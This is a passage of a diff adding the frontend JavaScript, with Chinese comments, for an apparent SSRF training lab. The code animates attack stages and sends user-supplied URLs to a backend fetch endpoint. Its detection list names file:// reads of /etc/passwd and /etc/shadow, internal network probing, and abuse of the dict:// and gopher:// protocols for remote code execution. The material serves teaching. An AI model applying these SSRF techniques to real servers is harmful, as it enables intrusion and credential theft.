+    ctx.fillStyle = node.color;
+    ctx.fillText(node.label, node.x, node.y + radius + 15);
+}
+
+/**
+ * 绘制攻击请求
+ */
+function drawRequests() {
+    attackRequests.forEach((req, index) => {
+        // 更新进度
+        req.progress += req.speed / 100;
+
+        if (req.progress >= 1) {
+            // 请求到达目标
+            if (req.type === 'probe') {
+                servicesFound++;
+                document.getElementById('statServices').textContent = servicesFound;
+            } else if (req.type === 'file') {
+                filesRead++;
+                document.getElementById('statFiles').textContent = filesRead;
+            } else if (req.type === 'attack') {
+                successfulAttacks++;
+                document.getElementById('statSuccess').textContent = successfulAttacks;
+            }
+            attackRequests.splice(index, 1);
+            return;
+        }
+
+        // 计算当前位置
+        const startX = req.startNode.x;
+        const startY = req.startNode.y;
+        const endX = req.endNode.x;
+        const endNode = req.endNode;
+        const currentX = startX + (endX - startX) * req.progress;
+        const currentY = startY + (endNode.y - startY) * req.progress;
+
+        // 绘制请求线
+        ctx.beginPath();
+        ctx.moveTo(startX, startY);
+        ctx.lineTo(currentX, currentY);
+        ctx.strokeStyle = req.color;
+        ctx.lineWidth = 3;
+        ctx.stroke();
+
+        // 绘制请求包
+        ctx.beginPath();
+        ctx.arc(currentX, currentY, 8, 0, Math.PI * 2);
+        ctx.fillStyle = req.color;
+        ctx.fill();
+
+        // 请求标签
+        ctx.fillStyle = '#fff';
+        ctx.font = 'bold 10px Arial';
+        ctx.textAlign = 'center';
+        ctx.fillText(req.label, currentX, currentY - 12);
+    });
+}
+
+/**
+ * 创建攻击请求
+ */
+function createRequest(type, startNode, endNode, color, label) {
+    return {
+        type: type,
+        startNode: startNode,
+        endNode: endNode,
+        color: color,
+        label: label,
+        progress: 0,
+        speed: 2 + Math.random() * 2
+    };
+}
+
+/**
+ * 更新攻击阶段
+ */
+function updatePhase() {
+    const phaseText = document.getElementById('phaseText');
+    const statusText = document.getElementById('statusText');
+    const statusDot = document.querySelector('.status-dot');
+
+    if (attackPhase === 0) {
+        phaseText.textContent = '待开始';
+        statusText.textContent = '待开始';
+        statusDot.className = 'status-dot green';
+    } else if (attackPhase === 1) {
+        phaseText.textContent = '探测内网服务';
+        statusText.textContent = '攻击进行中';
+        statusDot.className = 'status-dot yellow';
+    } else if (attackPhase === 2) {
+        phaseText.textContent = '读取敏感文件';
+        statusText.textContent = '攻击进行中';
+        statusDot.className = 'status-dot yellow';
+    } else if (attackPhase === 3) {
+        phaseText.textContent = '攻击内网服务';
+        statusText.textContent = '攻击进行中';
+        statusDot.className = 'status-dot red';
+    }
+}
+
+/**
+ * 主动画循环
+ */
+function animate() {
+    if (!isRunning) return;
+
+    animationFrame++;
+
+    // 清空画布
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    // 绘制背景
+    drawBackground();
+
+    // 绘制节点
+    drawNode(nodes.attacker);
+    drawNode(nodes.server);
+    nodes.internal.forEach(node => drawNode(node, 20));
+    drawNode(nodes.fileSystem, 20);
+
+    // 阶段1: 探测内网服务
+    if (attackPhase === 1 && animationFrame % 60 === 0) {
+        const target = nodes.internal[Math.floor(Math.random() * nodes.internal.length)];
+        attackRequests.push(createRequest('probe', nodes.attacker, nodes.server, '#ff4444', 'SSRF'));
+        attackRequests.push(createRequest('probe', nodes.server, target, '#00ccff', '请求'));
+        document.getElementById('statRequests').textContent = parseInt(document.getElementById('statRequests').textContent) + 1;
+    }
+
+    // 阶段2: 读取文件
+    if (attackPhase === 2 && animationFrame % 90 === 0) {
+        attackRequests.push(createRequest('file', nodes.attacker, nodes.server, '#ff4444', 'file://'));
+        attackRequests.push(createRequest('file', nodes.server, nodes.fileSystem, '#ffaa00', '读取'));
+        document.getElementById('statRequests').textContent = parseInt(document.getElementById('statRequests').textContent) + 1;
+    }
+
+    // 阶段3: 攻击服务
+    if (attackPhase === 3 && animationFrame % 45 === 0) {
+        const target = nodes.internal[Math.floor(Math.random() * nodes.internal.length)];
+        attackRequests.push(createRequest('attack', nodes.attacker, nodes.server, '#ff4444', '攻击'));
+        attackRequests.push(createRequest('attack', nodes.server, target, '#ff0000', 'exploit'));
+        document.getElementById('statRequests').textContent = parseInt(document.getElementById('statRequests').textContent) + 1;
+    }
+
+    // 绘制请求
+    drawRequests();
+
+    // 阶段切换提示
+    if (animationFrame === 180) {
+        attackPhase = 2;
+        updatePhase();
+    } else if (animationFrame === 360) {
+        attackPhase = 3;
+        updatePhase();
+    }
+
+    // 继续动画
+    animationId = requestAnimationFrame(animate);
+}
+
+/**
+ * 开始攻击演示
+ */
+function startAttack() {
+    if (isRunning) return;
+
+    isRunning = true;
+    attackPhase = 1;
+    animationFrame = 0;
+    attackRequests = [];
+    servicesFound = 0;
+    filesRead = 0;
+    successfulAttacks = 0;
+
+    document.getElementById('startBtn').disabled = true;
+    document.getElementById('stopBtn').disabled = false;
+    document.getElementById('statRequests').textContent = '0';
+    document.getElementById('statServices').textContent = '0';
+    document.getElementById('statFiles').textContent = '0';
+    document.getElementById('statSuccess').textContent = '0';
+
+    updatePhase();
+    animate();
+}
+
+/**
+ * 停止演示
+ */
+function stopAttack() {
+    isRunning = false;
+    document.getElementById('startBtn').disabled = false;
+    document.getElementById('stopBtn').disabled = true;
+
+    if (animationId) {
+        cancelAnimationFrame(animationId);
+    }
+}
+
+/**
+ * 重置动画
+ */
+function resetAnimation() {
+    stopAttack();
+
+    attackPhase = 0;
+    animationFrame = 0;
+    attackRequests = [];
+    servicesFound = 0;
+    filesRead = 0;
+    successfulAttacks = 0;
+
+    // 重置统计
+    document.getElementById('statRequests').textContent = '0';
+    document.getElementById('statServices').textContent = '0';
+    document.getElementById('statFiles').textContent = '0';
+    document.getElementById('statSuccess').textContent = '0';
+
+    updatePhase();
+
+    // 重绘画布
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    drawBackground();
+    drawNode(nodes.attacker);
+    drawNode(nodes.server);
+    nodes.internal.forEach(node => drawNode(node, 20));
+    drawNode(nodes.fileSystem, 20);
+}
+
+/**
+ * 设置URL
+ */
+function setUrl(url) {
+    document.getElementById('targetUrl').value = url;
+}
+
+/**
+ * 发送SSRF请求（调用真实API）
+ */
+async function sendSSRFRequest() {
+    const url = document.getElementById('targetUrl').value;
+
+    if (!url) {
+        alert('请输入URL');
+        return;
+    }
+
+    await executeSSRF(url);
+}
+
+/**
+ * 发送自定义Payload
+ */
+async function sendCustomPayload() {
+    const url = document.getElementById('customPayload').value;
+
+    if (!url) {
+        alert('请输入自定义URL');
+        return;
+    }
+
+    document.getElementById('targetUrl').value = url;
+    await executeSSRF(url);
+}
+
+/**
+ * 执行SSRF攻击（调用后端API）
+ */
+async function executeSSRF(url) {
+    const requestInfo = document.getElementById('requestInfo');
+    const requestDetails = document.getElementById('requestDetails');
+    const resultDiv = document.getElementById('ssrfResult');
+    const resultContent = document.getElementById('resultContent');
+    const attackAnalysis = document.getElementById('attackAnalysis');
+    const analysisContent = document.getElementById('analysisContent');
+
+    // 显示请求信息
+    requestInfo.style.display = 'block';
+    requestDetails.innerHTML = `<span style="color: #00ccff;">GET</span> /ssrf/fetch?url=<span style="color: #ffaa00;">${escapeHtml(url)}</span>
+<span style="color: #00ccff;">Host:</span> 127.0.0.1:5000
+<span style="color: #00ccff;">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+<span style="color: #00ccff;">Accept:</span> application/json`;
+
+    // 显示加载状态
+    resultDiv.style.display = 'block';
+    resultDiv.className = 'result-box result-warning';
+    resultContent.innerHTML = '<span style="color: #ffaa00;">⏳ 正在发送请求...</span>';
+    attackAnalysis.style.display = 'none';
+
+    try {
+        // 调用真实的后端API
+        const startTime = Date.now();
+        const response = await fetch(`/ssrf/fetch?url=${encodeURIComponent(url)}`);
+        const data = await response.json();
+        const endTime = Date.now();
+        const responseTime = endTime - startTime;
+
+        if (data.success) {
+            // 请求成功
+            resultDiv.className = 'result-box result-success';
+            resultContent.innerHTML = `<span style="color: #00ff88;">✓ 请求成功!</span>
+
+<span style="color: #00ccff;">状态码:</span> ${data.status || '200'}
+<span style="color: #00ccff;">响应时间:</span> ${responseTime}ms
+<span style="color: #00ccff;">URL:</span> ${escapeHtml(data.url)}
+
+<span style="color: #00ccff;">响应内容:</span>
+<div class="response-content">${escapeHtml(data.content)}</div>`;
+
+            // 显示攻击分析
+            attackAnalysis.style.display = 'block';
+            analysisContent.innerHTML = analyzeAttack(url, data);
+        } else {
+            // 请求失败
+            resultDiv.className = 'result-box result-error';
+            resultContent.innerHTML = `<span style="color: #ff4444;">✗ 请求失败</span>
+
+<span style="color: #00ccff;">错误信息:</span> ${escapeHtml(data.error)}
+<span style="color: #00ccff;">响应时间:</span> ${responseTime}ms
+
+<span style="color: #ffaa00;">提示: 服务可能未启动或无法访问</span>`;
+
+            attackAnalysis.style.display = 'block';
+            analysisContent.innerHTML = `<div class="alert alert-warning">
+<strong>可能的原因：</strong>
+<ul>
+<li>目标服务未运行（如Redis、MySQL等）</li>
+<li>文件路径不存在</li>
+<li>网络连接被阻止</li>
+</ul>
+</div>`;
+        }
+    } catch (error) {
+        resultDiv.className = 'result-box result-error';
+        resultContent.innerHTML = `<span style="color: #ff4444;">✗ 请求异常</span>
+
+<span style="color: #00ccff;">错误信息:</span> ${escapeHtml(error.message)}
+
+<span style="color: #ffaa00;">请检查网络连接或稍后重试</span>`;
+    }
+}
+
+/**
+ * 分析攻击类型和危害
+ */
+function analyzeAttack(url, data) {
+    let analysis = '';
+
+    if (url.includes('127.0.0.1') || url.includes('localhost')) {
+        analysis += `<div class="alert alert-danger">
+<strong>🚨 检测到内网探测攻击!</strong>
+<p>攻击者正在尝试访问本机服务，这可能导致：</p>
+<ul>
+<li>发现运行在本地的服务（Redis、MySQL、MongoDB等）</li>
+<li>获取服务版本信息，寻找已知漏洞</li>
+<li>利用未授权访问漏洞获取数据</li>
+</ul>
+</div>`;
+    }
+
+    if (url.includes('file://')) {
+        analysis += `<div class="alert alert-danger">
+<strong>🚨 检测到文件读取攻击!</strong>
+<p>攻击者正在尝试读取服务器文件，这可能导致：</p>
+<ul>
+<li>读取系统敏感文件（/etc/passwd、/etc/shadow）</li>
+<li>获取应用程序配置文件（数据库密码、API密钥）</li>
+<li>读取源代码文件</li>
+</ul>
+</div>`;
+    }
+
+    if (url.includes('192.168.') || url.includes('10.') || url.includes('172.')) {
+        analysis += `<div class="alert alert-danger">
+<strong>🚨 检测到内网横向移动!</strong>
+<p>攻击者正在尝试访问内网其他主机，这可能导致：</p>
+<ul>
+<li>发现内网拓扑结构</li>
+<li>攻击内网其他服务</li>
+<li>横向移动扩大攻击范围</li>
+</ul>
+</div>`;
+    }
+
+    if (url.includes('dict://') || url.includes('gopher://')) {
+        analysis += `<div class="alert alert-danger">
+<strong>🚨 检测到协议滥用攻击!</strong>
+<p>攻击者正在使用危险协议，这可能导致：</p>
+<ul>
+<li>通过dict://执行Redis命令</li>
+<li>通过gopher://攻击多种服务</li>
+<li>实现远程代码执行(RCE)</li>
+</ul>
+</div>`;
+    }
+
+    if (!analysis) {
+        analysis = `<div class="alert alert-info">
+<strong>ℹ️ 攻击分析</strong>
+<p>这是一个正常的URL请求，未检测到明显攻击特征。</p>
+<p>尝试其他URL来体验SSRF攻击效果。</p>
+</div>`;
+    }
+
+    return analysis;
+}
+
+/**
+ * HTML转义
+ */
+function escapeHtml(text) {
+    if (!text) return '';
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+// 初始化画布
+drawBackground();
+drawNode(nodes.attacker);
+drawNode(nodes.server);
+nodes.internal.forEach(node => drawNode(node, 20));
+drawNode(nodes.fileSystem, 20);
+</script>
+{% endblock %}
